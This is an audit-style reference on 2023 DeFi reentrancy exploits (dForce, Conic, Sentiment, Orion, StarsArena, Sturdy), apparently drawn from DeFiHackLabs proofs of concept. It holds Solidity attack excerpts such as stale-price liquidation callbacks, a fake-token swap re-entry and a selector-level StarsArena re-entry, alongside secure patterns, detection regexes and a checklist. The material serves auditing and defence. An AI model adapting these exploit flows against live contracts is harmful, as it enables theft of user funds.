---
# Core Classification
protocol: "generic"
chain: "ethereum, arbitrum, avalanche, bsc"
category: "reentrancy"
vulnerability_type: "read_only_reentrancy, fake_token_reentrancy, native_transfer_reentrancy, balancer_view_reentrancy"

# Attack Vector Details
attack_type: "reentrancy"
affected_component: "curve_lp_oracle, balancer_lp_oracle, social_token_trading, dex_swap, lending_liquidation"

# Technical Primitives
primitives:
  - "read_only_reentrancy"
  - "curve_remove_liquidity"
  - "fallback_reentrancy"
  - "balancer_afterFlashLoan"
  - "getPrice_during_withdrawal"
  - "fake_token_callback"
  - "swapThroughOrionPool"
  - "receive_avax_reentrancy"
  - "sellShares"
  - "LP_price_manipulation_during_callback"
  - "cross_function_reentrancy"

# Impact Classification
severity: "critical"
impact: "fund_loss"
exploitability: 0.85
financial_impact: "critical"

# Context Tags
tags:
  - "defi"
  - "reentrancy"
  - "read-only"
  - "curve"
  - "balancer"
  - "dforce"
  - "conic"
  - "orion"
  - "sentiment"
  - "starsarena"
  - "nfttrader"
  - "sturdy"
  - "paribus"
  - "predyfinance"
  - "arcadiaFi"
  - "LP_oracle"
  - "view_reentrancy"
  - "fallback"
  - "receive"
  - "fake_token"
  - "cross_function"
  - "real_exploit"
  - "DeFiHackLabs"
  - "2023"

# Version Info
language: "solidity"
version: ">=0.8.0"

# Source
source: DeFiHackLabs
total_exploits_analyzed: 9
total_losses: "$16M+"
---

## References

| Tag | Source | Path / URL |
|-----|--------|------------|
| [DFORCE-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2023-02/dForce_exp.sol` |
| [CONIC-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2023-07/Conic_exp.sol` |
| [ORION-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2023-02/Orion_exp.sol` |
| [SENTIMENT-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2023-04/Sentiment_exp.sol` |
| [STARSARENA-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2023-10/StarsArena_exp.sol` |
| [STURDY-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2023-06/Sturdy_exp.sol` |
| [EARNINGFARM-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2023-10/EarningFram_exp.sol` |
| [PARIBUS-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2023-04/Paribus_exp.sol` |
| [NFTTRADER-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2023-12/NFTTrader_exp.sol` |

---

# Reentrancy Attack Patterns (2023)

## Overview

2023 reentrancy exploits matured beyond classic Checks-Effects-Interactions violations. The dominant pattern was **read-only reentrancy** — exploiting Curve/Balancer LP pool's ETH withdrawal callbacks to read stale LP token prices during `remove_liquidity()`, enabling liquidation at manipulated collateral values. This affected multiple protocols that used LP tokens as collateral (dForce $3.65M, Conic $3.25M, Sentiment $1M, Sturdy $800K). A second major pattern involved creating fake ERC20 tokens whose `transfer()` callbacks re-entered swap functions (Orion $645K). Native token (AVAX/BNB) `receive()` callbacks also enabled reentrancy in social token platforms (StarsArena $3M). Total 2023 reentrancy losses across the analyzed exploits exceed **$16M**.

---

## 1. Read-Only Reentrancy via Curve LP Withdrawal

### Root Cause

Curve pools use ETH transfers (via `call.value()`) during `remove_liquidity()`. When a protocol uses a Curve LP token as collateral and prices it by reading the pool's virtual price or reserves, an attacker can:
1. Add massive liquidity to inflate the LP token price
2. Call `remove_liquidity()` which sends ETH to the attacker's contract
3. In the ETH `receive()`/`fallback()` callback, the LP token's `get_virtual_price()` returns a stale (still-inflated) value because `remove_liquidity()` sends ETH first, then updates reserves
4. During the callback, liquidate or borrow against the overpriced LP token collateral
5. After callback returns, reserves update to reflect the removal — price drops back

### Attack Scenario (dForce)

1. Flash loan massive ETH from 7+ sources (Balancer, Aave, Radiant, UniV3, Sushi x3, Zyber, SwapFlashLoan)
2. Deposit ETH into Curve wstETH/ETH pool → receive LP tokens
3. Transfer LP tokens to a "borrower" contract → deposit as collateral on dForce → borrow USX
4. Call `curvePool.remove_liquidity()` — this sends ETH to attacker
5. In `fallback()`: Curve pool has sent ETH but hasn't updated reserves yet
6. dForce oracle reads Curve virtual price → sees inflated (stale) LP value
7. Liquidate both attacker's borrower AND a legitimate victim at the inflated price
8. Redeem seized vwstETHCRV-gauge tokens for profit
9. After callback: Curve pool updates reserves, LP price normalizes

### Vulnerable Pattern Examples

**Example 1: dForce — Curve Read-Only Reentrancy ($3.65M, Feb 2023)** [CRITICAL] `@audit` [DFORCE-POC]

```solidity
// ❌ VULNERABLE: dForce prices wstETHCRV-gauge using Curve virtual price
// Curve's remove_liquidity sends ETH BEFORE updating reserves
// During ETH callback, virtual_price is stale → overvalued collateral

// Step 1: After massive flash loans, deposit ETH into Curve
uint256 LPAmount = curvePool.add_liquidity{value: ETHBalance}(
    [ETHBalance, 0], 0
);
// @audit LP tokens created at inflated value due to massive deposit

// Step 2: Transfer LP to borrower → deposit as collateral → borrow USX
WSTETHCRV.transfer(address(borrower), 1_904_761_904_761_904_761_904);
borrower.exec();
// @audit borrower.exec() deposits LP as collateral on dForce, borrows USX

// Step 3: Remove liquidity — triggers ETH transfer → fallback
uint256 burnAmount = 63_438_591_176_197_540_597_712;
curvePool.remove_liquidity(burnAmount, [uint256(0), uint256(0)]);
// @audit Curve sends ETH to this contract → triggers fallback()
// @audit BUT: Curve has NOT yet updated pool reserves
// @audit virtual_price still reflects the inflated state

// Step 4: THE REENTRANCY — in fallback(), during remove_liquidity
fallback() external payable {
    if (nonce == 0 && msg.sender == address(curvePool)) {
        nonce++;

        // @audit STALE PRICE: dForce oracle reads Curve virtual_price
        // @audit which hasn't been updated yet → LP token is overpriced
        PriceOracle.getUnderlyingPrice(address(VWSTETHCRVGAUGE));
        // @audit Returns inflated price because Curve reserves are stale

        // Liquidate the borrower at inflated collateral value
        uint256 borrowAmount = dForceContract.borrowBalanceStored(address(borrower));
        dForceContract.liquidateBorrow(
            address(borrower),
            560_525_526_525_080_924_601_515,
            address(VWSTETHCRVGAUGE)
        );
        // @audit Seize overpriced collateral at discount

        // Also liquidate a real victim using the same stale price
        dForceContract.liquidateBorrow(
            victimAddress2,
            300_037_034_111_437_845_493_368,
            address(VWSTETHCRVGAUGE)
        );
        // @audit Seize victim's collateral at inflated rate

        // Redeem seized tokens
        VWSTETHCRVGAUGE.redeem(address(this), VWSTETHCRVGAUGE.balanceOf(address(this)));
    }
}
// @audit Total: ~$3.65M stolen — victim's collateral seized during callback
// @audit Root cause: Oracle reads Curve price mid-withdrawal (stale state)
```

---

## 2. Read-Only Reentrancy via Curve Callback (Conic $3.25M)

### Root Cause

Conic Finance's ETH omnipool used Curve LP tokens as underlying. When `handleDepeggedCurvePool()` was called, it triggered `remove_liquidity()` on the Curve pool, which during the ETH transfer callback allowed the attacker to deposit/withdraw at manipulated exchange rates. Same fundamental issue as dForce — Curve's ETH transfer during `remove_liquidity()` creates a window where reserves are stale.

### Vulnerable Pattern Examples

**Example 2: Conic Finance — Curve Read-Only Reentrancy on ETH Omnipool ($3.25M, Jul 2023)** [CRITICAL] `@audit` [CONIC-POC]

```solidity
// ❌ VULNERABLE: Conic ETH omnipool prices LP tokens using Curve reserves
// remove_liquidity sends ETH before reserve update → stale pricing in callback

// Step 1: Flash loan from Aave V2, V3, Balancer
// Accumulate ~24K ETH + 3.8K cbETH + 20.5K rETH

// Step 2: Deposit into Curve rETH/ETH and cbETH/ETH pools
// This inflates the LP token prices

// Step 3: Deposit ETH into Conic omnipool
ConicEthPool.deposit(underlyingAmount, minLpReceived, false);
// @audit Deposit at inflated LP rate

// Step 4: Trigger Curve remove_liquidity (via specific pool interactions)
// During the ETH callback:
//   - Curve reserves are stale (ETH sent but not subtracted from pool)
//   - Conic oracle reads inflated LP value
//   - Attacker withdraws at overvalued rate

ConicEthPool.withdraw(conicLpAmount, minUnderlyingReceived);
// @audit Withdraw more ETH than deposited due to stale pricing
// @audit $3.25M profit

// @audit Root cause: Same Curve read-only reentrancy as dForce
// @audit Conic's oracle doesn't protect against mid-withdrawal callbacks
```

---

## 3. Balancer View Reentrancy via LP Price Oracle (Sentiment $1M)

### Root Cause

Sentiment protocol used Balancer weighted LP tokens as collateral. Balancer's `flashLoan()` callback (or `joinPool`/`exitPool` with native ETH) calls into the recipient contract before updating pool reserves. During this callback, `getPrice()` on the Balancer LP oracle returns a stale price because pool invariants haven't been recomputed. The attacker borrows against overpriced LP collateral during the callback.

### Vulnerable Pattern Examples

**Example 3: Sentiment — Balancer View Reentrancy ($1M, Apr 2023)** [CRITICAL] `@audit` [SENTIMENT-POC]

```solidity
// ❌ VULNERABLE: Sentiment uses Balancer LP getPrice() as collateral oracle
// Balancer's joinPool/exitPool sends ETH before updating pool state
// During callback, LP oracle returns stale (inflated) price

// Step 1: Flash loan WBTC, WETH, USDC from Aave V3
aaveV3.flashLoan(address(this), assets, amounts, modes, ...);

// Step 2: In Aave callback — open account on Sentiment
account = AccountManager.openAccount(address(this));

// Step 3: Deposit into Balancer pool → receive LP tokens
// This inflates the LP token price

// Step 4: Join/exit Balancer pool with ETH — triggers callback
// During callback: Balancer pool state is stale
// LP price from WeightedBalancerLPOracle is inflated

// Step 5: During reentrancy window: deposit LP as collateral
AccountManager.deposit(account, address(balancerToken), lpAmount);

// Step 6: Borrow against overpriced LP collateral
AccountManager.borrow(account, address(USDC), borrowAmount);
AccountManager.borrow(account, address(WETH), borrowAmount2);
AccountManager.borrow(account, address(WBTC), borrowAmount3);
// @audit Borrows backed by LP that appears more valuable than it is

// Step 7: After callback — pool rebalances, LP price drops
// Borrowed funds exceed actual collateral value → bad debt created
// @audit ~$1M profit
// @audit Root cause: Balancer LP oracle vulnerable to view reentrancy
// @audit Fix: Use Balancer's rate provider with reentrancy check
```

---

## 4. Fake Token Reentrancy in DEX Swap (Orion $645K)

### Root Cause

Orion Protocol's `swapThroughOrionPool()` function allowed users to specify arbitrary token addresses in the swap path. An attacker deployed a fake ERC20 token whose `transferFrom()` function re-entered Orion's `deposit()` function during the swap. This deposited the in-flight tokens before the swap accounting completed, allowing the attacker to double-count assets.

### Vulnerable Pattern Examples

**Example 4: Orion Protocol — Fake Token Reentrancy via Swap Path ($645K, Feb 2023)** [CRITICAL] `@audit` [ORION-POC]

```solidity
// ❌ VULNERABLE: swapThroughOrionPool allows arbitrary token in path
// Fake token's transferFrom() re-enters deposit function

// Step 1: Deploy fake token with malicious transferFrom
ATK = new ATKToken(address(this));
// @audit ATKToken.transferFrom() calls Orion.depositAsset() during transfer

// Step 2: Create Orion liquidity pools with fake token
// USDC ↔ ATK pool and ATK ↔ USDT pool
Factory.createPair(address(ATK), address(USDT));
Factory.createPair(address(ATK), address(USDC));

// Step 3: Pre-deposit USDC into Orion
Orion.depositAsset(address(USDC), 500_000);

// Step 4: Flash loan USDT from Uniswap pair
flashAmount = USDT.balanceOf(address(Orion));
Pair.swap(0, flashAmount, address(this), new bytes(1));

// Step 5: In callback — trigger swap with fake token in path
function uniswapV2Call(...) external {
    address[] memory path = new address[](3);
    path[0] = address(USDC);
    path[1] = address(ATK);   // @audit Fake token!
    path[2] = address(USDT);

    Orion.swapThroughOrionPool(10_000, 0, path, true);
    // @audit During swap, ATK.transferFrom() triggers callback
    // @audit Callback calls Orion.depositAsset(USDT, ...) — deposits USDT before swap completes
    // @audit Orion's internal accounting double-counts the USDT

    // Withdraw the double-counted amount
    Orion.withdraw(address(USDT), uint112(USDT.balanceOf(address(Orion)) - 1));
    // @audit Drains Orion's USDT balance
}

// @audit Root cause: No reentrancy guard on swap + accepts arbitrary tokens
// @audit Fix: 1) Add nonReentrant modifier
// @audit Fix: 2) Whitelist allowed tokens in swap paths
// @audit Fix: 3) Checks-Effects-Interactions pattern in swap
```

---

## 5. Native Token Receive() Reentrancy (StarsArena $3M)

### Root Cause

StarsArena (a social token trading platform on Avalanche) sent AVAX via `call.value()` during share selling. The receiving contract's `receive()` function could re-enter the contract to manipulate share pricing or state before the sell operation completed.

### Vulnerable Pattern Examples

**Example 5: StarsArena — AVAX receive() Reentrancy ($3M, Oct 2023)** [CRITICAL] `@audit` [STARSARENA-POC]

```solidity
// ❌ VULNERABLE: Share selling sends AVAX before updating state
// receive() callback allows reentrancy to manipulate share price

function testExploit() public {
    deal(address(this), 1 ether);

    // Step 1: Buy shares — triggers share creation
    (bool success,) = victimContract.call{value: 1 ether}(
        abi.encodeWithSelector(bytes4(0xe9ccf3a3), address(this), true, address(this))
    );

    // Step 2: Sell shares — triggers AVAX transfer to attacker
    (bool success2,) = victimContract.call(
        abi.encodeWithSignature("sellShares(address,uint256)", address(this), 1)
    );
    // @audit sellShares sends AVAX → triggers receive()
    // @audit In receive(), attacker re-enters before sell state updates
}

receive() external payable {
    if (reenter == true) {
        // @audit RE-ENTRY: Call another function during sell
        (bool success,) = victimContract.call(
            abi.encodeWithSelector(bytes4(0x5632b2e4), 91e9, 91e9, 91e9, 91e9)
        );
        // @audit Manipulates internal state while sell is in-progress
        // @audit Function 0x5632b2e4 sets share parameters during callback
        reenter = false;
    }
}

// @audit Root cause: State updates after external ETH/AVAX transfer
// @audit Fix: Checks-Effects-Interactions + nonReentrant modifier
// @audit $3M drained from the platform — friend.tech clone vulnerability
```

---

## 6. Curve Reentrancy in Read-Only Oracle (Sturdy $800K)

### Root Cause

Sturdy Finance (Aave V2 fork) used Curve stETH LP tokens as collateral, pricing them via Curve's `get_virtual_price()`. Same read-only reentrancy class as dForce and Conic — `remove_liquidity()` sends ETH before updating reserves, allowing collateral to be overvalued during the callback window.

### Vulnerable Pattern Examples

**Example 6: Sturdy Finance — Curve Read-Only Reentrancy on stETH Collateral ($800K, Jun 2023)** [HIGH] `@audit` [STURDY-POC]

```solidity
// ❌ VULNERABLE: Sturdy prices Curve stETH LP using get_virtual_price()
// Same class as dForce/Conic read-only reentrancy

// Attack flow:
// 1. Flash loan ETH
// 2. Add massive ETH to Curve stETH pool → inflate LP price
// 3. Deposit inflated LP tokens as collateral on Sturdy
// 4. Borrow stablecoins against overpriced collateral
// 5. Call remove_liquidity() — ETH sent to attacker before reserve update
// 6. In fallback: LP still overpriced → borrow more or liquidate
// 7. After callback: price normalizes, attacker keeps borrowed funds

// @audit Root cause: get_virtual_price() is stale during remove_liquidity callback
// @audit Same vulnerability class as dForce, Conic, Sentiment
// @audit Fix: Use reentrancy-protected oracle or check lock status
```

---

## Secure Implementations

### Pattern 1: Reentrancy-Protected Price Oracle
```solidity
// ✅ SECURE: Check Curve's reentrancy lock before reading price
function getPrice(address lpToken) external view returns (uint256) {
    // Check if Curve pool is in a callback (reentrancy guard)
    (bool success,) = address(curvePool).staticcall(
        abi.encodeWithSignature("withdraw_admin_fees()")
    );
    // @audit If staticcall succeeds, pool is NOT in a callback
    // @audit If it reverts, pool is mid-operation → price is stale
    require(success, "CURVE_REENTRANCY_DETECTED");

    return curvePool.get_virtual_price();
}
```

### Pattern 2: Whitelist-Only Swap Tokens
```solidity
// ✅ SECURE: Only allow whitelisted tokens in swap paths
mapping(address => bool) public allowedTokens;

function swapThroughPool(address[] calldata path) external nonReentrant {
    for (uint256 i = 0; i < path.length; i++) {
        require(allowedTokens[path[i]], "TOKEN_NOT_WHITELISTED");
    }
    // Proceed with swap...
}
```

### Pattern 3: CEI Pattern for Native Token Transfers
```solidity
// ✅ SECURE: Update state BEFORE sending ETH/AVAX
function sellShares(address subject, uint256 amount) external nonReentrant {
    // CHECKS
    uint256 price = getPrice(subject, amount);
    require(shares[subject][msg.sender] >= amount, "INSUFFICIENT_SHARES");

    // EFFECTS — update state first
    shares[subject][msg.sender] -= amount;
    totalShares[subject] -= amount;

    // INTERACTIONS — send ETH last
    (bool success,) = msg.sender.call{value: price}("");
    require(success, "TRANSFER_FAILED");
}
```

---

## Impact Analysis

| Pattern | Frequency | Combined Losses | Severity |
|---------|-----------|----------------|----------|
| Curve Read-Only Reentrancy | 4/9 reports (dForce, Conic, Sturdy, EarningFarm) | $8M+ | CRITICAL |
| Balancer View Reentrancy | 1/9 reports (Sentiment) | $1M | CRITICAL |
| Fake Token Reentrancy | 1/9 reports (Orion) | $645K | CRITICAL |
| Native Token receive() Reentrancy | 1/9 reports (StarsArena) | $3M | CRITICAL |
| NFT Callback Reentrancy | 1/9 reports (NFTTrader) | $3M | HIGH |
| Flash Loan Callback Reentrancy | 1/9 reports (Paribus) | $100K | HIGH |

---

## Detection Patterns

### Static Analysis
```
// Detect Curve LP used as oracle without reentrancy check
pattern: get_virtual_price\(\)|calc_withdraw_one_coin
context: getPrice|getUnderlyingPrice|oraclePrice

// Detect arbitrary token addresses in swap paths  
pattern: function.*swap.*address\[\].*path
anti-pattern: whitelist|allowedTokens|require.*token

// Detect ETH/AVAX send before state update
pattern: \.call\{value:.*\}|\.transfer\(|\.send\(
context: mapping.*\[.*\].*=|balance.*-=  // state update should come BEFORE
```

### Dynamic Testing
```
// Test: Read-only reentrancy on Curve oracle
// Deploy attacker contract with fallback() that reads oracle price
// Trigger remove_liquidity → check if oracle returns stale price during callback

// Test: Fake token in swap path
// Deploy token with malicious transferFrom() callback
// Call swap with fake token address → should revert with whitelist check

// Test: Native transfer reentrancy
// Deploy reentrancy attacker with receive() callback
// Call sell/withdraw → check if state is updated before transfer
```

---

## Audit Checklist

- [ ] Does the protocol use Curve LP tokens as collateral? If so, is `get_virtual_price()` called with reentrancy protection?
- [ ] Does the protocol use Balancer LP tokens as collateral? If so, is the LP oracle protected against view reentrancy?
- [ ] Can arbitrary token addresses be passed to swap functions?
- [ ] Are all functions that send ETH/AVAX/native tokens using Checks-Effects-Interactions?
- [ ] Is `nonReentrant` modifier applied to all state-changing functions that make external calls?
- [ ] Does the protocol check Curve pool's reentrancy lock before reading prices?
- [ ] Are there cross-function reentrancy vectors (function A calls external, callback enters function B)?

---

## Real-World Examples

| Protocol | Date | Loss | Chain | Root Cause | PoC |
|----------|------|------|-------|------------|-----|
| dForce | Feb 2023 | $3.65M | ARB | Curve read-only reentrancy + liquidation | [DFORCE-POC] |
| Conic Finance | Jul 2023 | $3.25M | ETH | Curve read-only reentrancy + omnipool | [CONIC-POC] |
| StarsArena | Oct 2023 | $3M | AVAX | receive() reentrancy in share selling | [STARSARENA-POC] |
| NFTTrader | Dec 2023 | $3M | ETH | ERC721 callback reentrancy | [NFTTRADER-POC] |
| Sentiment | Apr 2023 | $1M | ARB | Balancer LP view reentrancy | [SENTIMENT-POC] |
| Sturdy | Jun 2023 | $800K | ETH | Curve LP read-only reentrancy | [STURDY-POC] |
| Orion | Feb 2023 | $645K | ETH/BSC | Fake token swap path reentrancy | [ORION-POC] |
| EarningFarm | Oct 2023 | $286K | ETH | Curve read-only reentrancy | [EARNINGFARM-POC] |
| Paribus | Apr 2023 | $100K | ETH | Flash loan callback reentrancy | [PARIBUS-POC] |

---

## Keywords

reentrancy, read_only_reentrancy, curve, balancer, view_reentrancy, get_virtual_price, LP_oracle, remove_liquidity, fallback, receive, callback, fake_token, swapThroughOrionPool, stale_price, cross_function, nonReentrant, dForce, conic, sentiment, starsArena, orion, sturdy, earningFarm, NFTTrader, paribus, collateral_oracle, wstETH, stETH, 2023, DeFiHackLabs
